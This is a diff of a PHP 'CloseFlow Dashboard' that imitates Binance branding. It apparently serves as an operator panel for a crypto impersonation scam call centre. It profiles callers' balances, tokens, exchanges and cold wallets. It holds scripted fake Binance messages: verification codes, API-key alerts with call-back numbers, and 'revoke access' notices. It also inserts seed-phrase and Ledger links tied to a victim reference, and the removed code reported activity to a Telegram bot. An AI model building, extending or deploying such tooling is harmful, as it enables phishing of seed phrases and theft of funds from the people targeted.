@@ -1,79 +1,69 @@
 <?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
 date_default_timezone_set('Europe/London');
 require_once 'functions.php';
 require_once 'config/db_config.php';
-//exit("Hello World");
+
 $agent  = $_GET['agent']  ?? 'Unknown';
 $caller = $_GET['caller'] ?? 'Unknown';
 
 $department = 'Unknown';
 
+$last_login = '';
+$balance = '';
+$tokens = '';
+$exchanges = '';
+$cold_wallets = '';
+$notes = '';
+$reference = '';
+
 $conn = getDbConnection();
 if ($conn && $agent !== 'Unknown') {
     $eAgent = mysqli_real_escape_string($conn, $agent);
-    $sql = "SELECT au.role, au.adminid, ad.department FROM ausers as au JOIN adminuser as ad ON au.adminid = ad.id WHERE user = '$eAgent' LIMIT 1";
+
+    $sql = "SELECT au.*, ad.department 
+            FROM ausers AS au 
+            JOIN adminuser AS ad ON au.adminid = ad.id 
+            WHERE au.user = '$eAgent' 
+            LIMIT 1";
     $result = mysqli_query($conn, $sql);
+
     if ($row = mysqli_fetch_assoc($result)) {
         $role = strtolower($row['role']);
         $department = $row['department'] ?? '';
-    }
-    //mysqli_close($conn);
-}
+        $agent_id = $row['id'] ?? '';
 
-$insernewdata = insertdata($conn, $agent, $caller);
-mysqli_close($conn);
+        $userInfo = getUserInfoByAgent($conn, $agent_id);
 
-function insertdata($conn, $agent, $caller)
-{
-    $eAgent  = mysqli_real_escape_string($conn, $agent);
-    $eCaller = mysqli_real_escape_string($conn, $caller);
-    $eAction = 'verify';
+        if (!$userInfo && !empty($caller)) {
+            $agent_id = getAgentIdByCaller($conn, $caller);
 
-    $aCaller = '61' . substr(substr($eCaller, 3), 0, -1); // 0 + drop first 3 + drop last
-    $adminCaller = mysqli_real_escape_string($conn, $aCaller);
-    $todattime = date('Y-m-d H:i:s');
-    $sqlAdmin = "
-      INSERT INTO adminsmsdata (agent, number, butclick, insertdate)
-      VALUES ('$eAgent', '$adminCaller', '$eAction','$todattime')
-    ";
-    $okAdmin = mysqli_query($conn, $sqlAdmin);
+            if ($agent_id) {
+                $userInfo = getUserInfoByAgent($conn, $agent_id);
+            }
+        }
 
-    if (!$okAdmin) {
-
-        file_put_contents(date('Y-m-d') . "_newdata_adminsqlerror", date('H:i:s') . " _" . mysqli_error($conn) . PHP_EOL, FILE_APPEND);
-    }
-    $sqlOwner = "
-      INSERT INTO ownersmsdata (agent, number, butclick, insertdate)
-      VALUES ('$eAgent', '$adminCaller', '$eAction','$todattime')
-    ";
-    $okOwner = mysqli_query($conn, $sqlOwner);
-
-    if (!$okOwner) {
-
-        file_put_contents(date('Y-m-d') . "newdata_adminsqlerror", date('H:i:s') . " _" . mysqli_error($conn) . PHP_EOL, FILE_APPEND);
+        if ($userInfo) {
+            $last_login   = $userInfo['last_login']   ?? '';
+            $balance      = $userInfo['balance']      ?? '';
+            $tokens       = $userInfo['tokens']       ?? '';
+            $exchanges    = $userInfo['exchanges']    ?? '';
+            $cold_wallets = $userInfo['cold_wallets'] ?? '';
+            $notes        = $userInfo['notes']        ?? '';
+            $reference    = $userInfo['reference']    ?? '';
+        }
     }
 }
 
-if (isset($role) && $role == 'open') {
-
-    $jsonData = [
-        'Activity' => 'OTP',
-        'Department' => $department,
-        'Agent' => $agent . ' (Open)',
-    ];
-
-    sendDataToTelegramBot($jsonData);
-}
+closeDbConnection($conn);
 
 ?>
+
 <!DOCTYPE html>
 <html lang="en" class="dark">
 
 <head>
     <meta charset="UTF-8">
-    <title>OpenFlow Dashboard</title>
+    <title>CloseFlow Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
@@ -126,7 +116,6 @@ if (isset($role) && $role == 'open') {
 </head>
 
 <body class="dark:bg-binance-bg-dark bg-white text-white font-sans min-h-screen">
-
     <header class="border-b border-gray-100 dark:border-gray-800 px-4 py-4">
         <div class=" flex justify-between items-center">
             <div class="flex items-center space-x-2"><a href="/"><img src="./assets/images/Binance_logo.svg" class="w-[120px] h-[24px]" alt="logo"></a></div>
@@ -141,15 +130,14 @@ if (isset($role) && $role == 'open') {
         </div>
     </header>
     <div class="px-4 mt-3 mb-4 md:text-start text-center md:flex justify-between items-center">
-       <div>
-         <h1 class="md:text-3xl text-lg font-bold text-[#232323] dark:text-white">OpenFlow Dashboard</h1>
-        <p class="md:text-lg mt-1 text-[#949597]">Manage verification and triggers customer communication during active calls.</p>
-       </div>
+        <div>
+            <h1 class="md:text-3xl text-lg font-bold text-[#232323] dark:text-white">CloseFlow Dashboard</h1>
+            <p class="md:text-lg mt-1 text-[#949597]">Revoke access, regenerate seed phrase and protect users from digital asset breaches. </p>
+        </div>
         <div class="mt-4 md:mt-0">
             <button id="alert-team-modal" class="bg-[#5dacf8] hover:bg-[#5dacf8] hover:opacity-[0.9] rounded-[8px] py-2 px-4">Alert Team Manager</button>
         </div>
     </div>
-    
     <!-- Alert Team Manager Modal -->
     <div id="alert-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
         <div class="bg-white dark:bg-[#1E2026] rounded-lg shadow-xl max-w-md w-full mx-4 overflow-hidden">
@@ -186,8 +174,8 @@ if (isset($role) && $role == 'open') {
 
             <!-- Reference Input -->
             <div class="flex items-center space-x-2 mb-8">
-                <input type="text" id="ref-text" placeholder="Enter Reference" class="flex-1 dark:border-gray-200 dark:border-0 dark:inset-shadow-xs border px-4 py-4 text-black rounded">
-                <button id="verified" class="cursor-default bg-gray-500 px-4 py-[14px] rounded text-white text-xl font-bold">
+                <input value="<?php echo $reference ?>" type="text" id="ref-text" placeholder="Enter Reference" class="flex-1 dark:border-gray-200 dark:border-0 dark:inset-shadow-xs border px-4 py-4 text-black rounded">
+                <button id="verified" class="cursor-default bg-[#659c36] px-4 py-[14px] rounded text-white text-xl font-bold">
                     <span>
                         <svg fill="#ffffff" class="w-7" viewBox="0 0 1920 1920" xmlns="http://www.w3.org/2000/svg" stroke="#ffffff">
                             <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
@@ -212,74 +200,83 @@ if (isset($role) && $role == 'open') {
             <?php endif; ?>
 
             <div class="space-y-8">
-                <!-- Verify -->
+                <!-- API key cancel -->
                 <div class="mb-8">
-                    <button id="btn-reference-verify" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Verify</button>
+                    <button id="btn-api-cancel" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key Cancel</button>
                     <div class="bg-[#232323] text-white text-sm mt-3 rounded">
-                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="verify-example">
+                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="api-cancel-example">
                             <strong>Example:</strong>
                             <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
                                 <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
                             </svg>
                         </div>
-                        <div id="verify-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
-                            Your verification code is <span id="verification-code" class="font-bold">876-827</span><br>
-                            Never share this code with anyone. Only a genuine advisor will confirm it to you.
+                        <div id="api-cancel-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
+                            External wallet API connection cancelled. The API keys have been removed from your account and access revoked.
                         </div>
                     </div>
+                </div>
+                <div class="mb-8">
                     <div class="bg-[#232323] text-white text-sm mt-3 rounded">
                         <div class="flex items-center justify-between p-3">
                             <strong>Qualification:</strong>
                         </div>
 
-                        <form id="user-info-form" class="space-y-4 p-3 mt-1">
+                        <div class="space-y-4 p-3 mt-1">
                             <div>
-                                <label for="last_login" class="block text-sm font-medium text-white mb-1">🕒 Last Login:</label>
-                                <input type="text" id="last_login" name="last_login" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
-                            </div>
-                            <div>
-                                <label for="balance" class="block text-sm font-medium text-white mb-1">💵 Balance:</label>
-                                <input type="text" id="balance" name="balance" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
+                                <label class="block text-sm font-medium text-white mb-1">🕒 Last Login: <span class="text-gray-300"><?php echo htmlspecialchars($last_login); ?></span></label>
+
                             </div>
                             <div>
-                                <label for="tokens" class="block text-sm font-medium text-white mb-1">🪙 Tokens:</label>
-                                <input type="text" id="tokens" name="tokens" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
+                                <label class="block text-sm font-medium text-white mb-1">💵 Balance: <span class="text-gray-300"><?php echo htmlspecialchars($balance); ?></span></label>
+
                             </div>
                             <div>
-                                <label for="exchanges" class="block text-sm font-medium text-white mb-1">🏦 Exchanges:</label>
-                                <input type="text" id="exchanges" name="exchanges" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
+                                <label class="block text-sm font-medium text-white mb-1">🪙 Tokens: <span class="text-gray-300"><?php echo htmlspecialchars($tokens); ?></span></label>
+
                             </div>
                             <div>
-                                <label for="cold_wallets" class="block text-sm font-medium text-white mb-1">❄️ Cold Wallets:</label>
-                                <input type="text" id="cold_wallets" name="cold_wallets" class="w-full px-3 py-2 rounded border border-gray-300 text-black">
+                                <label class="block text-sm font-medium text-white mb-1">🏦 Exchanges: <span class="text-gray-300"><?php echo htmlspecialchars($exchanges); ?></span></label>
+
                             </div>
                             <div>
-                                <label for="notes" class="block text-sm font-medium text-white mb-1">🗒 Notes:</label>
-                                <textarea id="notes" name="notes" rows="3" class="w-full px-3 py-2 rounded border border-gray-300 text-black"></textarea>
+                                <label class="block text-sm font-medium text-white mb-1">❄️ Cold Wallets: <span class="text-gray-300"><?php echo htmlspecialchars($cold_wallets); ?></span></label>
                             </div>
-                            <div class="flex justify-end">
-                                <button type="submit" id="save-user-info" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] hover:bg-binance-brand-gold text-black px-4 py-2 text-base rounded hover:opacity-[0.8] hover:bg-binance-brand-gold">
-                                    Submit
-                                </button>
+                            <div>
+                                <label class="block text-sm font-medium text-white mb-1">🗒 VIP Notes: <span class="text-gray-300"><?php echo htmlspecialchars($notes); ?></span></label>
                             </div>
-                        </form>
+                        </div>
                     </div>
 
                 </div>
 
-                <!-- API Key -->
+                <!-- Seed Phrase -->
                 <div class="mb-8">
-                    <button id="btn-api-key" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">API Key</button>
+                    <button id="btn-seed-phrase" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Seed Phrase</button>
                     <div class="bg-[#232323] text-white text-sm mt-3 rounded">
-                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="api-key-example">
+                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="seed-phrase-example">
                             <strong>Example:</strong>
                             <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
                                 <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
                             </svg>
                         </div>
-                        <div id="api-key-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
-                            API Keys for an external wallet was successfully attached to your account. If this was not initiated by you call us immediately on <br>
-                            <span id="support-phone">+61 1800576977 or +61 26105933</span>
+                        <div id="seed-phrase-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
+                            <span id="seed-url"><?php echo SEED_URL . $reference ?></span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Ledger -->
+                <div class="mb-8">
+                    <button id="btn-ledger" class="text-binance-bg-dark font-semibold bg-binance-brand-gold rounded-[8px] w-[-webkit-fill-available] h-12 text-base py-1.5 px-3 min-w-[48px] hover:opacity-[0.8] hover:bg-binance-brand-gold">Ledger</button>
+                    <div class="bg-[#232323] text-white text-sm mt-3 rounded">
+                        <div class="flex items-center justify-between p-3 cursor-pointer example-toggle" data-target="ledger-example">
+                            <strong>Example:</strong>
+                            <svg class="w-4 h-4 transform transition-transform arrow-icon" fill="currentColor" viewBox="0 0 20 20">
+                                <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"></path>
+                            </svg>
+                        </div>
+                        <div id="ledger-example" class="example-content hidden px-3 p-3 border-t border-gray-600">
+                            <span id="ledger-url"><?php echo LEDGER_URL ?></span>
                         </div>
                     </div>
                 </div>
